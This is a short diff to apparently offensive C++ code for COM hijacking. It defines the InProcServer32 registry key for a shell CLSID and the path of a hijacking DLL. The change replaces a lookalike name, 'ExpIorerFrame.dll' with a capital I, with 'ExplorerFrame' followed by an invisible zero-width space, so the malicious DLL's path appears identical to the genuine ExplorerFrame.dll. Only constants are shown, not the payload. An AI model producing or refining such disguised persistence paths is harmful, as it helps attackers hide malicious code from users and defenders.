@@ -36,7 +36,7 @@ private:
     static constexpr const wchar_t* CLSID_KEY = 
         L"CLSID\\{ab0b37ec-56f6-4a0e-a8fd-7a8bf7c2da96}\\InProcServer32";
     static constexpr const wchar_t* HIJACKED_DLL = 
-        L"%SystemRoot%\\system32\\ExpIorerFrame.dll";
+        L"%SystemRoot%\\system32\\ExplorerFrame\u200B.dll";
     static constexpr const wchar_t* ORIGINAL_DLL = 
         L"%SystemRoot%\\system32\\ExplorerFrame.dll";
     
